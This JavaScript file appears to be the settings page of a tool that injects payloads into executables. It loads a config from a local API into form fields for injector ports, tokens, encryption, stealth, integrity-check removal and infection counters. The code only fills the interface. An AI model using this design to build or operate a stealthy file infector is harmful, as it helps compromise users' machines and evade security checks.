//----------------------------------------------------------------------------//
//  active when finished loading                                              //
//----------------------------------------------------------------------------//
$(document).ready(function(){
  readconfig();
});



//----------------------------------------------------------------------------//
//  functions                                                                 //
//----------------------------------------------------------------------------//

function readconfig() {

		/* create xmlhttp object */
		var xmlhttp=new XMLHttpRequest();
		
		/* set onreadystatechange function */
		xmlhttp.onreadystatechange=function() {
			if (xmlhttp.readyState==4 && xmlhttp.status==200) {
				// server request
				resttxt = xmlhttp.responseText;
				// split string to 2D-Array   (key \n value \n\n)
				var iniarray = resttxt.split("\n");
				for(i=0;i<iniarray.length;i++) {
				  //check valid (key \n value)
				  if(iniarray[i].indexOf("{|~|}") > -1) {
				    iniarray[i] = iniarray[i].split("{|~|}");
				    var key = iniarray[i][0];
				    var val = iniarray[i][1];
				    // do your thing!!!
            switch(key) {
              case 'INJECTOR_port':
                $('#controlport_write_TXT1').val(val)
                break;
              case 'INJECTOR_token':
                $('#token_write_TXT1').val(val)
                break;
              case 'WEBSERVER_port':
                $('#webport_TXT1').val(val)
                break;
              case 'WEBSERVER_localhostonly':
                val = (val == 1 || val == 'true' || val == 'True' || val == 'TRUE');
                setLocalGlobalButtons('webinterface', val);
                break;
              case 'INJECTOR_ip':
                $('#controlip_TXT1').val(val)
                break;
              case 'WEBSERVER_basicauth':
                val = (val == 1 || val == 'true' || val == 'True' || val == 'TRUE');
                setOnOffButtons('enableauth', val);
                break;
              case 'server_control_interface':
                val = (val == 1);
                setLocalGlobalButtons('controlinterface', val);
                break;
              case 'server_data_interface':
                val = (val == 1);
                setLocalGlobalButtons('datainterface', val);
                break;
              case 'integrity_remove_integrity_check':
                val = (val == 1);
                setOnOffButtons('removeintegity', val);
                break;
              case 'name_section_name_random':
                val = (val == 1);
                setOnOffButtons('randomsectionname', val);
                break;
              case 'name_section_name':
                $('#sectionname_TXT1').val(val)
                break;
              case 'server_control_port':
                $('#controlport_TXT1').val(val)
                break;
              case 'server_data_port':
                $('#dataport_TXT1').val(val)
                break;
              case 'server_token':
                $('#token_TXT1').val(val)
                break;
              case 'methods_encrypt_iterations':
                $('#encryptiterations_TXT1').val(val)
                break;
              case 'methods_method_cross_section_jump_iterations':
                $('#crosssectionjumpiterations_TXT1').val(val)
                break;
              case 'methods_method_change_flags':
                val = (val == 1);
                setOnOffButtons('changeflags', val);
                break;
              case 'methods_method_new_section':
                val = (val == 1);
                setOnOffButtons('newsection', val);
                break;
              case 'methods_method_alignment_resize':
                val = (val == 1);
                setOnOffButtons('alignmentresize', val);
                break;
              case 'methods_method_alignment':
                val = (val == 1);
                setOnOffButtons('alignment', val);
                break;
              case 'methods_encrypt':
                val = (val == 1);
                setOnOffButtons('enableencrypt', val);
                break;
              case 'methods_method_cross_section_jump':
                val = (val == 1);
                setOnOffButtons('crosssectionjump', val);
                break;
              case 'integrity_try_stay_stealth':
                val = (val == 1);
                setOnOffButtons('trystaystealth', val);
                break;
              case 'server_enable':
                val = (val == 1);
                setOnOffButtons('enable', val);
                break;
              case 'name_payload_name_x86':
                var myelement = document.getElementById("status_32bit_name");
                if(myelement != null) {
                  myelement.innerHTML = val;
                }
                break;
              case 'statistics_infection_counter_x86':
                var myelement = document.getElementById("status_32bit_counter");
                if(myelement != null) {
                  myelement.innerHTML = val;
                }
                break;
              case 'name_payload_name_x64':
                var myelement = document.getElementById("status_64bit_name");
                if(myelement != null) {
                  myelement.innerHTML = val;
                }
                break;
              case 'statistics_infection_counter_x64':
                var myelement = document.getElementById("status_64bit_counter");
                if(myelement != null) {
                  myelement.innerHTML = val;
                }
                break;
              default:
                break;
            }//END switch
				  }//END: if
				}//END for
				
			}
		}
		
		/* send request */
		xmlhttp.open("POST","/api/get/config",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("key=getconfig&value=None");
}//-------------------------------------------------






